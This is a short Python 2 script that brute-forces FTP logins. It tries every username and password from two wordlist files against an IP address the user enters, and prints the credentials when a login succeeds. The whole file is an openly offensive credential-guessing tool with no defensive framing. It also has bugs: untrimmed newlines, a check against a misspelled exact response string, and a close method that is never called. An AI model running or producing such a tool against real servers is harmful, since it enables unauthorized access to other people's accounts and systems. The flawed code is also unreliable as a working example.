import ftplib
import sys

def brute(ip, user, passw):
    try:
      ud = open(user, 'r')
      pd = open(passw, 'r')

      users = ud.readlines()
      passwords = pd.readlines()
      for user in users:
        for password in passwords: 
          try:
            print 'Trying to connect'
            connect = ftplib.FTP(ip)
            ans = connect.login(user, password)
            if ans == '230 Login succesfull.':
              print 'Succesfull attack'
              print 'User: ', user
              print 'Password: ', password
              sys.exit()
            else:
              pass
          except ftplib.error_perm:
               print 'Cant Brute force with user: ' + user + 'and password: ' + password
               connect.close
               
          
           
    except(KeyboardInterrupt):
         print 'Sesion Interrupted'
    
ip = raw_input('IP: ')
user = 'user.txt'
password = 'password.txt'
brute(ip, user, password)
